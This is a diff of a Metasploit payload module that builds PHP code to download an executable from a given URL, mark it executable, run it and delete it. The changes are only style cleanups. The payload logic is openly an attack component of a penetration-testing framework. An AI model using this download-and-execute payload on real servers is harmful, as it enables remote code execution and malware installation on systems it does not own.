@@ -1,15 +1,13 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 require 'msf/core'
 require 'msf/core/payload/php'
 
-
 module MetasploitModule
-
   CachedSize = :dynamic
 
   include Msf::Payload::Php
@@ -17,14 +15,13 @@ module MetasploitModule
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'          => 'PHP Executable Download and Execute',
-      'Description'   => 'Download an EXE from an HTTP URL and execute it',
-      'Author'        => [ 'egypt' ],
-      'License'       => BSD_LICENSE,
-      'Platform'      => 'php',
-      'Arch'          => ARCH_PHP,
-      'Privileged'    => false
-      ))
+                      'Name'          => 'PHP Executable Download and Execute',
+                      'Description'   => 'Download an EXE from an HTTP URL and execute it',
+                      'Author'        => [ 'egypt' ],
+                      'License'       => BSD_LICENSE,
+                      'Platform'      => 'php',
+                      'Arch'          => ARCH_PHP,
+                      'Privileged'    => false))
 
     # EXITFUNC is not supported :/
     deregister_options('EXITFUNC')
@@ -33,7 +30,8 @@ module MetasploitModule
     register_options(
       [
         OptString.new('URL', [ true, "The pre-encoded URL to the executable" ])
-      ], self.class)
+      ], self.class
+    )
   end
 
   def php_exec_file
@@ -63,20 +61,19 @@ module MetasploitModule
     fclose($fd_out);
     chmod($fname, 0777);
     $c = $fname;
-    #{php_preamble({:disabled_varname => dis})}
-    #{php_system_block({:cmd_varname => "$c", :disabled_varname => dis})}
+    #{php_preamble(disabled_varname: dis)}
+    #{php_system_block(cmd_varname: '$c', disabled_varname: dis)}
     @unlink($fname);
     END_OF_PHP_CODE
 
-    #return Rex::Text.compress(shell)
-    return shell
+    # return Rex::Text.compress(shell)
+    shell
   end
 
   #
   # Constructs the payload
   #
   def generate
-    return php_exec_file
+    php_exec_file
   end
-
 end
